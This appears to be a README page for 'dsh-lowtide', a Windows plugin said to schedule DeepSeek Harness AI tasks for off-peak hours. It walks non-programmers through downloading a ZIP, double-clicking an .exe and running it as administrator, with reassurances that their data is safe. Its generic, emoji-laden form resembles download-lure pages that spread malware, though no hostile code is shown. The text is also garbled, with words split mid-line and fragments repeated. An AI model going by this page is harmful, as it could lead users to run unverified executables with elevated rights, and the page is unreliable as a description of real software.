AI tasks during off-peak hours to cut costs and automate runs with dsh-lowtide for DeepSeek Harness.
⏳ dsh-lowtide - Plan now, run later, effortlessly
⬇️ DOWNLOAD NOW
## 🎯 What Is dsh-lowtide?
dsh-lowtide is a friendly helper app that lets you **plan your tasks whenever you want**, and then i
t **runs them for you automatically** when your computer is not busy. Think of it like a smart assis
tant that works the night shift while you sleep.
You write down what you need done, set a time, and walk away. When you come back, dsh-lowtide has a
clean report waiting for you. No need to watch, wait, or click anything.
## 🧩 Who Is This For?

This app is perfect for anyone who:
- Uses DeepSeek Harness (dsh) for AI tasks
- Wants to schedule w

ork to run at night or off-peak hours
- Prefers to review results before they are finalized
- Uses a

Windows computer
- Has no programming experience
If you can browse the web and click a button, you can use dsh-lowtide.
## ✨ Key Features

### 🕐 Time-Shifting Magic
You decide when a task runs. Set it for 2 AM, next Tuesday, or whenever yo
ur computer is idle. dsh-lowtide handles the rest.

### 📋 Task Queue Manager
Add multiple tasks at once. dsh-lowtide keeps them in order and works throu

nager
Add multiple tasks at once. dsh-lowtide keeps them in order and works through them one by one.

### 🤝 Human Approval Step
Before any task result is saved, you get a chance to review it. You can ap
prove, reject, or edit. You stay in control.

### 📊 Automatic Reports
After tasks finish, dsh-lowtide creates a simple summary. You can see what w
orked, what failed, and what needs attention.

### 💻 Works on Desktop and Web
Use it as a regular desktop app on your Windows machine, or access it
through your web browser. Same experience, same results.

### 🔌 Built for DeepSeek Harness
This is a plugin designed specifically to work with dsh. If you alr
eady use dsh, this adds scheduling powers instantly.
## 🚀 Getting Started
### Step 1: Download the Application
Visit this link to download the application:
🔗 GET dsh-lowtide
This link takes you to the official download page. Look for the green button that says "Code" or "Do
wnload". Click it and choose "Download ZIP". The file will start downloading to your computer.
### Step 2: Get the File Ready
Once the download finishes, find the downloaded file in your "Downloads" folder. It will be a ZIP fi
le. Right-click on it and choose "Extract All". Windows will ask where to put the files. Choose a si
mple location like your Desktop or Documents folder. Click "Extract".
### Step 3: Start the Application
Open the folder you just extracted. Inside, you will see a file called `dsh-lowtide.exe` or `start.b
at`. Double-click it. The application will open in your web browser automatically. If it asks for pe
rmission, click "Yes" or "Allow".
### Step 4: Connect to DeepSeek Harness
When the app opens, you will see a simple setup screen. It will ask for your dsh connection details.
This is usually just an address like `http://localhost:8080` and a port number. If you are not sure
, check your dsh settings or the dsh documentation.
### Step 5: Plan Your First Task
Click the "New Task" button. Type in what you want done. For example: "Summarize the meeting notes"
or "Generate a report from last week's data". Set the time you want it to run. You can pick a specif
ic time or choose "When idle".
### Step 6: Walk Away
That is it. dsh-lowtide will wait until the right time, run your task, and save the results. When yo
u come back, open the app and click "Reports" to see what happened.
## 🖥️ System Requirements
dsh-lowtide is designed to run on any modern Windows computer. Here is what you need:

- **Operating System:** Windows 10 or Windows 11
- **Memory:** At least 4 GB of RAM (8 GB recommende

d)
- **Storage:** 500 MB of free space
- **Internet:** A stable connection (only needed for download

ing and for dsh communication)
- **DeepSeek Harness:** A working installation of dsh on your compute

dsh communication)
- **DeepSeek Harness:** A working installation of dsh on your computer or network
No special hardware or technical skills required.
## ❓ Frequently Asked Questions

### Do I need to know how to code?
No. Everything is point-and-click. If you can use a web browser,
you can use dsh-lowtide.

### Is my data safe?
Yes. All your tasks and reports stay on your own computer. Nothing is sent to e
xternal servers except what you explicitly share with dsh.

### What happens if my computer turns off during a task?
dsh-lowtide is smart. If a task is interrup
ted, it will mark it as "Incomplete" in the report. You can simply run it again later.

### Can I use this on a Mac?
This version is built for Windows. Mac support may come in the future.

### How do I update the app?
Visit the same download link and grab the newest version. Replace the o
ld folder with the new one. Your tasks and reports are stored separately, so they will not be lost.
## 🛠️ Troubleshooting

### The app does not open
Make sure you extracted the ZIP file completely. Try right-clicking the EX
E file and selecting "Run as administrator".

### I cannot connect to dsh
Double-check the address and port number. Make sure dsh is running befor
e you start dsh-lowtide.

### Tasks are not running at the scheduled time
Check that your computer is awake and not in sleep m
ode. You can adjust power settings to prevent sleep during scheduled tasks.

### The report is empty
This usually means the task failed silently. Check the "Logs" tab in the app
for error messages. Most issues are fixed by checking the dsh connection.
